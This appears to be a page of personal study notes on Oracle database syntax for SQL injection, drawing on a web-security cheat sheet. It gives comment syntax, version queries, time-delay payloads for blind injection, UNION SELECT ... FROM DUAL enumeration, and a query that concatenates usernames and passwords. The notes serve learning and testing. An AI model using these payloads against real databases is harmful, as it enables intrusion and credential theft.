# Oracle Database

## Comment Syntax

1. `--` denotes a single-line comment
	* `--COMMENT HERE`
	* No required whitespace, unlike MySQL
2. `/* */` denotes a multi-line comment
	* `/*COMMENT HERE*/` 

---

## Version Query Syntax

```sql
SELECT BANNER FROM v$version
```

```sql
SELECT BANNER_FULL FROM v$version
```

---

## String Concatenation Syntax

```sql
SELECT username||':'||password FROM users
```

* Can concatenate both column names and string literals in any order

---

## Time delay syntax

[Reference](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Unconditionally wait for 10 seconds

```sql
dbms_pipe.receive_message(('a'), 10)
```

### Conditionally wait for 10 seconds

```sql 
SELECT CASE WHEN ($CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`
```

---

## `UNION SELECT` Target Table Requirement

In Oracle, the SQL syntax of the `UNION SELECT` operation requires a target table leveraging the `FROM` operator.

For example, the following column data type enumeration query **would not** work in Oracle:

```sql
SELECT name, description FROM products UNION SELECT NULL, 'a'
```

Since the `UNION SELECT` query requires a target table using the `FROM` operator, it is most common to use the Oracle's built-in `DUAL` table for this purpose. The following column data type enumeration query **would** work in Oracle:

```sql
SELECT name, description FROM products UNION SELECT NULL, 'a' FROM DUAL
```

---

## Table enumeration

[[database-enumeration#Querying database tables Oracle]]

---

## Table column enumeration

[[database-enumeration#Querying database tables' columns Oracle]]